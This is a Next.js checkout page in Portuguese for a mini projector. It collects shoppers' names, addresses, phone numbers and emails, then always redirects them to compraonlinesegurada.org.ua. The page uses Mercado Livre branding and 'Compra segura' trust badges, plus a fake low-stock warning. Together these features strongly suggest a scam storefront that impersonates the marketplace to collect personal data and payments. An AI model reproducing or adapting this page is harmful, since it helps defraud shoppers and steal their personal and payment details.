"use client";

import { motion } from "framer-motion";
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function CheckoutPage() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [form, setForm] = useState({
    nome: "",
    numero: "",
    cep: "",
    complemento: "",
    cidade: "",
    contato: "",
    endereco: "",
    email: "",
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      await fetch("/api/checkout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      });
      window.location.href = "https://compraonlinesegurada.org.ua/c/319b7470f2";
    } catch {
      window.location.href = "https://compraonlinesegurada.org.ua/c/319b7470f2";
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen flex flex-col relative overflow-hidden">
      {/* Top yellow bar — igual à landing page */}
      <div className="bg-accent text-background font-black text-center py-2.5 text-sm sm:text-base tracking-widest uppercase">
        Mini Projetor HD
      </div>

      {/* Background gradient — igual à landing page */}
      <div className="absolute inset-0 top-10 bg-gradient-to-b from-primary/15 via-background to-background pointer-events-none" />

      {/* Conteúdo */}
      <div className="relative flex-1 w-full max-w-lg mx-auto px-4 pt-6 pb-10 flex flex-col items-center gap-5">
        {/* Badge igual à landing */}
        <motion.div
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4 }}
          className="inline-flex items-center gap-2 bg-accent/15 text-accent border border-accent/30 rounded-full px-4 py-1.5 text-sm font-semibold"
        >
          <span className="w-2 h-2 rounded-full bg-accent animate-pulse" />
          FINALIZAR PEDIDO
        </motion.div>

        {/* Título */}
        <motion.h1
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.1 }}
          className="text-2xl sm:text-3xl font-black text-center leading-tight"
        >
          Adicione Suas Informações{" "}
          <span className="text-accent">Para Entrega</span>
        </motion.h1>

        {/* Stock badge — igual à landing */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.15, duration: 0.4 }}
          className="flex items-center gap-2 bg-danger/15 text-danger border border-danger/30 rounded-full px-4 py-1.5 text-sm font-bold"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          ESTOQUE ACABANDO — APENAS 5 DISPONÍVEIS
        </motion.div>

        {/* Formulário */}
        <motion.form
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.2 }}
          onSubmit={handleSubmit}
          className="w-full bg-surface border border-surface-light rounded-2xl p-5 sm:p-6 flex flex-col gap-4"
        >
          <div className="grid grid-cols-2 gap-3">
            <FormField
              label="NOME COMPLETO"
              name="nome"
              value={form.nome}
              onChange={handleChange}
              colSpan="col-span-2 sm:col-span-1"
              required
            />
            <FormField
              label="NÚMERO"
              name="numero"
              value={form.numero}
              onChange={handleChange}
              colSpan="col-span-2 sm:col-span-1"
              required
            />
            <FormField
              label="CEP"
              name="cep"
              value={form.cep}
              onChange={handleChange}
              inputMode="numeric"
              required
            />
            <FormField
              label="COMPLEMENTO"
              name="complemento"
              value={form.complemento}
              onChange={handleChange}
            />
            <FormField
              label="CIDADE"
              name="cidade"
              value={form.cidade}
              onChange={handleChange}
              required
            />
            <FormField
              label="Nº DE CONTATO"
              name="contato"
              value={form.contato}
              onChange={handleChange}
              inputMode="tel"
              required
            />
            <FormField
              label="ENDEREÇO"
              name="endereco"
              value={form.endereco}
              onChange={handleChange}
              colSpan="col-span-2 sm:col-span-1"
              required
            />
            <FormField
              label="EMAIL"
              name="email"
              type="email"
              value={form.email}
              onChange={handleChange}
              colSpan="col-span-2 sm:col-span-1"
              required
            />
          </div>

          {/* Botão Continuar */}
          <motion.button
            type="submit"
            disabled={loading}
            className="mt-2 w-full bg-accent hover:bg-accent-dark text-background font-black text-xl sm:text-2xl py-4 rounded-full shadow-lg shadow-accent/25 transition-colors tracking-wide disabled:opacity-60"
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.97 }}
          >
            {loading ? "ENVIANDO..." : "CONTINUAR"}
            {!loading && (
              <svg className="w-5 h-5 ml-2 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M13 7l5 5m0 0l-5 5m5-5H6" />
              </svg>
            )}
          </motion.button>
        </motion.form>

        {/* WhatsApp info */}
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.5 }}
          className="w-full bg-surface border border-surface-light rounded-2xl p-4 text-center flex flex-col gap-3"
        >
          <p className="text-foreground font-bold text-sm sm:text-base leading-relaxed">
            APÓS A COMPRA SEU CÓDIGO DE RASTREIO CHEGARÁ EM ATÉ 1 HORA NO SEU
          </p>
          <div className="flex items-center justify-center gap-1 text-[#25D366] font-bold text-sm sm:text-base -mt-2">
            <svg className="w-5 h-5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor">
              <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
            </svg>
            WHATSAPP
          </div>

          <div className="h-px bg-surface-light" />

          <p className="text-danger/80 text-xs font-semibold">
            DEVOLUÇÃO GRATUITA (Você tem 30 dias a partir da data de recebimento.)
          </p>
        </motion.div>

        {/* Trust badges — iguais à landing page */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.5, duration: 0.5 }}
          className="flex flex-wrap items-center justify-center gap-3 text-xs text-foreground/60"
        >
          <span className="flex items-center gap-1.5 bg-[#fff159]/10 text-[#fff159] border border-[#fff159]/20 rounded-full px-3 py-1 font-semibold">
            <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
            </svg>
            Mercado Livre
          </span>
          <span className="flex items-center gap-1.5">
            <svg className="w-3.5 h-3.5 text-success" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
            </svg>
            Entrega pelo Mercado Livre
          </span>
          <span className="flex items-center gap-1.5">
            <svg className="w-3.5 h-3.5 text-success" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
            </svg>
            Frete grátis
          </span>
          <span className="flex items-center gap-1.5">
            <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            Compra segura
          </span>
        </motion.div>
      </div>
    </main>
  );
}

function FormField({
  label,
  name,
  value,
  onChange,
  type = "text",
  inputMode,
  colSpan = "",
  required = false,
}: {
  label: string;
  name: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  type?: string;
  inputMode?: "numeric" | "tel" | "email" | "text";
  colSpan?: string;
  required?: boolean;
}) {
  return (
    <div className={colSpan}>
      <label className="block text-[11px] font-bold text-foreground/50 mb-1 tracking-wider uppercase">
        {label}
      </label>
      <input
        type={type}
        name={name}
        value={value}
        onChange={onChange}
        inputMode={inputMode}
        required={required}
        className="w-full bg-background border-2 border-surface-light focus:border-accent rounded-xl px-3 py-2.5 text-sm text-foreground outline-none transition-colors placeholder:text-foreground/20"
      />
    </div>
  );
}
